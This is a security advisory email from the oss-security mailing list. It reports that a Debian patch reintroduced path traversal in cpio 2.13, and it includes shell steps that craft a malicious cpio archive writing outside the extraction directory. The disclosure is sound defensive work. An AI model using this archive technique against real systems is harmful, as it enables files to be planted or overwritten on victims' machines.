Received: (qmail 15686 invoked by uid 550); 21 Dec 2023 16:50:17 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9582 invoked from network); 21 Dec 2023 16:45:16 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oddnet.de; s=DKIM001;
	t=1703177146;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:mime-version:mime-version:content-type:content-type:
	 content-transfer-encoding:content-transfer-encoding;
	bh=ov3U712zqsFezIuoFeJwxxo8Iw4v2huqGZ16kUfJoZc=;
	b=X2xMeR/RpAz6ylX9LwM/WIPkosp5yOvlWUEAUtje63PWCXtljaE2hliAxronaQltGoGaQd
	zgtp4++KGafHnEJ2BJg6qz9er+Ek1Ri+DP/BW8VxmBcYzM0MfxI3+wKGm9CuPy330X1WXP
	Og5ygQAMLhwPRI8TT1t+ZYcGh+BHTNog6oGFppp+omxV/HuZ7vbSKOrQnUKYSHVM8QC/Fl
	ewUxhiVaYph09PM8twmxvg+GvQ0VkVWZ7g0YZKO+kJjUp7OOpm6OhQFCj2ADsofivcojf3
	KCDajCPG6o6YZhULUYYImSuxJ6HjBWsahxU9tmXvBk9S2KW7rvpTLRvWrPpzFQ==
Message-ID: <65846ba9.7d4fbb18.bm000@oddnet.de>
From: =?ISO-8859-1?Q?Ingo=20Br=FCckl?= <ib@oddnet.de>
To: oss-security@lists.openwall.com
Date: Thu, 21 Dec 2023 17:44:50 +0100
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Type: text/plain; charset=ISO-8859-1
X-Mailer: blueMail/Linux 1.5
Subject: [oss-security] Security vulnerability in Debian's cpio 2.13

Debian has applied patch "revert-CVE-2015-1197-handling" to cpio
(2.13+dfsg-7.1) to "Fix a regression in handling of CVE-2015-1197 &
--no-absolute-filenames by reverting part of an upstream commit." and to
close Debian bugs #946267 ("cpio -i --no-absolute-filenames breaks symlinks
starting with / or /..") and #946469 ("initramfs-tools-core: unmkinitrams
creates broken binaries").

This patch made Debian cpio 2.13 vulnerable to path traversal.

The vulnerability has been reported to the Debian bug tracking system:

  https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059163

Instructions to craft a cpio archive to demonstrate the vulnerability:

  mkdir test_cpio
  ln -sf /tmp/ test_cpio/tmp
  echo "TEST Traversal" > test_cpio/tmpYtrav.txt
  cd test_cpio/
  ls | cpio -ov > ../trav.cpio
  cd ../
  sed -i s/"tmpY"/"tmp\/"/g trav.cpio

Even

  cpio -id --no-absolute-filenames -I trav.cpio

doesn't prevent path traversal with Debian's cpio, although it does with the
original cpio.

Ingo
